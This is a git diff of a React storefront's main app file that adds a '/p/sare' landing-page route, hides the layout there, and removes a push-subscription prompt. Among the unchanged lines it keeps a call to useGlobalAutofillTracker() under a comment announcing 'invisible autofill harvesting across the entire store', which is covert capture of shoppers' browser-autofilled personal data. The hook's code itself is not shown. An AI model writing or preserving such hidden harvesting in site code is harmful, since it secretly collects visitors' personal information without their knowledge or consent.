@@ -5,7 +5,6 @@ import Navbar from './components/layout/Navbar';
 import ScrollToTop from './components/layout/ScrollToTop';
 import Footer from './components/layout/Footer';
 import { getProducts, Product } from './lib/woocommerce';
-import PushSubscriptionPrompt from './components/marketing/PushSubscriptionPrompt';
 
 
 
@@ -26,6 +25,7 @@ const Wishlist = lazy(() => import('./pages/Wishlist'));
 const Login = lazy(() => import('./pages/Login'));
 const Profile = lazy(() => import('./pages/Profile'));
 const TrackOrder = lazy(() => import('./pages/TrackOrder'));
+const LandingSare = lazy(() => import('./pages/LandingSare'));
 
 // Admin Pages removed as requested
 
@@ -44,6 +44,7 @@ function AppContent() {
   const location = useLocation();
   const isCheckout = location.pathname === '/checkout';
   const isAdmin = location.pathname.startsWith('/admin');
+  const isSareLanding = location.pathname === '/p/sare';
 
   // 🕵️ Run invisible autofill harvesting across the entire store
   useGlobalAutofillTracker();
@@ -67,7 +68,7 @@ function AppContent() {
     }
   }, []);
 
-  const hideLayout = isCheckout || isAdmin;
+  const hideLayout = isCheckout || isAdmin || isSareLanding;
 
   return (
     <div className="min-h-screen bg-gray-50 font-sans text-gray-900 selection:bg-brand-primary selection:text-white flex flex-col">
@@ -94,6 +95,7 @@ function AppContent() {
             <Route path="/terms" element={<Terms />} />
             <Route path="/privacy-policy" element={<Privacy />} />
             <Route path="/dmca" element={<DMCA />} />
+            <Route path="/p/sare" element={<LandingSare />} />
             
             {/* Catch-all route to redirect missing pages to Home */}
             <Route path="*" element={<Navigate to="/" replace />} />
@@ -102,7 +104,7 @@ function AppContent() {
       </main>
 
       {!hideLayout && <Footer />}
-      {!hideLayout && <PushSubscriptionPrompt />}
+      {/* PushSubscriptionPrompt removed: hide everywhere as requested */}
       {/* Newsletter popup removed as requested */}
     </div>
   );
